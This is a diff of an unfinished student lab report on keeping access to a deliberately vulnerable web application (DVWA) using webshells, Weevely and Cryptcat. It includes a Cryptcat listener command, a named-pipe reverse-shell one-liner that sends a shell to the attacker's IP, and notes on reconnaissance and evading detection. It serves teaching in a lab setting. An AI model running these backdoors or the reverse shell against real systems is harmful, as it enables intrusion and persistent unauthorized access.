@@ -14,16 +14,16 @@ controlled environment or on authorized targets.
 **Objective:** To demonstrate post-exploitation techniques for maintaining access on a compromised target server using three distinct tools (*Webshells; Weevely; Cryptcat*).  
 **Target Environment:** *Kali Linux* (Attacker) and Vulnerable Target Application (*Damn Vulnerable Web Application, DVWA*)  
 
-## Installing & Setting up Target Environment: Vulnerable Target Application (DVWA)  
+## Installation & Setting up Target Environment: Vulnerable Target Application (DVWA)  
 (insert ss)  
 **Command**: `blahblah`
 
 ## Tool 1: Webshells  
 **Webshell** consist of a single-line script that executes system commands through web browser URL parameters. They are written in web programming languages such as *PHP, Java, Perl* and others. An attacker can control the script and a *command injection vulnerability* occurs.  
 **Key Features:**  
-- Simplicity: Small enough to be hidden inside legitimate website code without drawing attention.
+"- Simplicity: Small enough to be hidden inside legitimate website code without drawing attention.
 - Firewall Evasion: Traffic blends in perfectly with normal HTTP/HTTPS web browsing.
-- Stateless Execution: Does not hold a constant, open network connection that administrators might detect, and only connects when a command is actively sent.
+- Stateless Execution: Does not hold a constant, open network connection that administrators might detect, and only connects when a command is actively sent"― *Gemini*
 
 **Step-by-Step Execution:**  
 
@@ -39,9 +39,9 @@ controlled environment or on authorized targets.
 ## Tool 2: Weevely  
 " **Weevely** is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones"―  *Kali Linux*  
 **Key Features:**  
-- Polymorphic Obfuscation: Evades basic antivirus and Intrusion Detection Systems (IDS).
+"- Polymorphic Obfuscation: Evades basic antivirus and Intrusion Detection Systems (IDS).
 - Encrypted Communications: Secures the traffic between the attacker and the web server.
-- Built-in Post-Exploitation Modules: Allows for system enumeration, file management, and lateral movement without uploading additional tools.
+- Built-in Post-Exploitation Modules: Allows for system enumeration, file management, and lateral movement without uploading additional tools"― *Gemini*
 
 **Step-by-Step Execution:**  
 
@@ -58,9 +58,43 @@ controlled environment or on authorized targets.
 **Reason of command:** This initiates the encrypted connection from the attacker machine to the uploaded script, establishing the remote command-line interface.  
 (insert ss)  
 **Command:** `system_info`  
-**Reason of command:**  
+**Reason of command:** This command performs automated system reconnaissance. It instantly tells the attacker what operating system is running, the kernel version, and the current user privileges. This is the critical first step in planning a "Privilege Escalation" attack to become the root administrator. 
 **Command:** `file_ls`  
-**Reason of command:**  
+**Reason of command:** This command allows the attacker to silently map out the target's file system. Instead of guessing where things are, the attacker uses this to browse the server's folders to locate sensitive information such as database configuration files with hardcoded passwords, without triggering security alarms. 
+
+## Tool 3: Cryptcat  
+CryptCat provides a two-way encrypted version of the standard NetCat enhanced program, where it functions as the most basic Unix utility tool, reading and publishing data across network connections (Chandel, 2020). CryptCat encrypts data that users send across a network using either the TCP or UDP protocol, and it acts as a dependable back-end tool that users can easily utilize with scripts (Chandel, 2020).  
+**Key Features:**
+"- Military-Grade Twofish Encryption: Ensures that packet sniffers (like Wireshark) cannot read the commands or data being transmitted.
+- Protocol/Service Independence: Bypasses the need for a web server entirely; works directly over raw TCP ports.
+- Bi-Directional Versatility: Can act as a listener or a client to create stealthy, point-to-point data connections"― *Gemini*
+
+**Step-by-Step Execution:**  
+
+**Step 1: Setting up the Encrypted Listener (Attacker)**  
+(insert ss)  
+**Command:** `cryptcat -k <Password> -l -v -p 4444`  
+**Reason of command:** This opens port 4444 on the attacker's machine and silently waits for the victim machine to call back, ensuring only connections with the correct password are accepted.  
+**Step 2: Triggering the Reverse Shell (Victim)**  
+(insert ss)  
+**Command:** `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | cryptcat 10.x.x.x 4444 -k <Password> > /tmp/f`  
+**Reason of command:** Because modern Linux systems disable the easy -e execution flag, this command creates a "Named Pipe" (mkfifo). It loops the input and output of a hidden bash shell directly into the encrypted Cryptcat tunnel pointing back to the attacker's IP.  
+**Step 3: Verification**  
+(insert ss)  
+**Action:** Executing commands such as `id` and `ls` on the listener terminal.  
+**Reason of action:** To prove that the network tunnel is successfully routing system commands back and forth securely.  
+
+## Comparative Discussion  
+Based on our experience using these tools, all of it manage to successfully maintain post-exploitation access. However, they operate at different network layers and serve distinct strategic purposes.  
+  
+  The simple *Webshell* and *Weevely* both function at the Application Layer as web backdoors, meaning their persistence relies entirely on the target's Apache web server remaining active. Even so, they differ in complexity. The *Webshell* offers extreme stealth through a minimalist, stateless design that blends into normal HTTP traffic, whereas *Weevely* provides a comprehensive, encrypted framework packed with automated enumeration modules.  
+
+  On the other hand, *Cryptcat* operates at the Transport Layer to establish a standalone network tunnel. *Cryptcat* removes the dependency on the web server entirely by using a named pipe to route the shell through Twofish encryption. Consequently, this ensures that if the web application is taken offline or patched by administrators, a secure, independent lifeline to the underlying operating system remains intact.  
+
+## Conclusion
+(Write a brief concluding sentence about how relying on multiple persistence methods ensures an attacker maintains access even if one backdoor is discovered and patched).  
+
+## References
 
 
 
